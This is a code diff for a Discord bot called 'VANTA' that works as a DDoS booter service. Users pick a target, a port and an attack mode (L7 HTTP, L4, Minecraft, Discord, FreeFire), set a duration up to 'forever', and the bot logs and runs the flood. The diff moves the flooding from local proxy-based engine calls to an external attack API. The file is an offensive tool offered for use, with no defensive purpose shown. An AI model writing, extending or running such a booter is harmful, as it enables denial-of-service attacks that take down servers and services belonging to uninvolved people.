@@ -8,7 +8,6 @@ import traceback
 from urllib.parse import urlparse
 
 import discord
-from discord import ui
 from discord.ext import commands
 
 from config import (
@@ -30,7 +29,6 @@ bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 db = Database()
 engine = AttackEngine()
 
-# user_id -> {task, mode, target, port, msg, ...}
 active_attacks: dict[int, dict] = {}
 
 
@@ -64,7 +62,6 @@ def is_forbidden(target: str) -> bool:
 
 
 def _parse_duration(s: str):
-    """1h / 1d / 1m / TH → seconds; TH = 0 (forever)"""
     s = s.strip()
     if s.upper() == "TH":
         return 0
@@ -92,7 +89,6 @@ async def on_ready():
     os.makedirs(DATA_DIR, exist_ok=True)
     await db.init()
     print(f"[VANTA] logged in as {bot.user}")
-    print(f"[VANTA] loaded {len(engine.proxies)} proxies")
 
 
 @bot.event
@@ -119,7 +115,6 @@ async def ddos_cmd(ctx):
             flags=discord.MessageFlags.components_v2,
         )
     except TypeError:
-        # fallback สำหรับ discord.py เก่า
         await ctx.send(view=build_panel())
 
 
@@ -259,7 +254,6 @@ async def start_attack(interaction: discord.Interaction, mode: str,
         )
         return
 
-    # edit ephemeral message → attack running
     try:
         await interaction.response.edit_message(
             view=build_attack_running(
@@ -272,7 +266,6 @@ async def start_attack(interaction: discord.Interaction, mode: str,
         return
 
     msg = await interaction.original_response()
-
     await db.log_attack(user_id, target, port, mode, duration)
 
     state = {
@@ -288,9 +281,6 @@ async def start_attack(interaction: discord.Interaction, mode: str,
     state["task"] = asyncio.create_task(_attack_loop(user_id, state))
 
 
-# ═══════════════════════════════════════════
-# Attack loop
-# ═══════════════════════════════════════════
 async def _attack_loop(user_id: int, state: dict):
     target = state["target"]
     port   = state["port"]
@@ -311,20 +301,23 @@ async def _attack_loop(user_id: int, state: dict):
             pass
 
     try:
-        if mode == "l7":
-            await engine.attack_l7(target, total, on_tick)
-        elif mode == "l4":
-            host = _extract_host(target)
-            await engine.attack_l4(host, port, total, 200, on_tick)
-        elif mode == "minecraft":
-            host = _extract_host(target)
-            await engine.attack_minecraft(host, port, total, 200, on_tick)
-        elif mode == "discord":
-            host = _extract_host(target)
-            await engine.attack_discord(host, port, total, 200, on_tick)
-        elif mode == "freefire":
-            host = _extract_host(target)
-            await engine.attack_freefire(host, port, total, 200, on_tick)
+        # ยิงผ่าน API
+        result = await engine.attack_via_api(target, port, total, mode)
+
+        if not result.get("success"):
+            await on_tick(0, 0, f"API Error: {result.get('error', 'unknown')}")
+            return
+
+        # API ไม่มี callback → ต้องนับเวลาเอง
+        start = time.time()
+        last = start
+        while time.time() - start < total:
+            await asyncio.sleep(1)
+            elapsed = time.time() - start
+            time_left = max(0, int(total - elapsed))
+            speed = await engine.measure_speed(target, port)
+            await on_tick(time_left, 1, speed)
+
     except asyncio.CancelledError:
         pass
     except Exception:
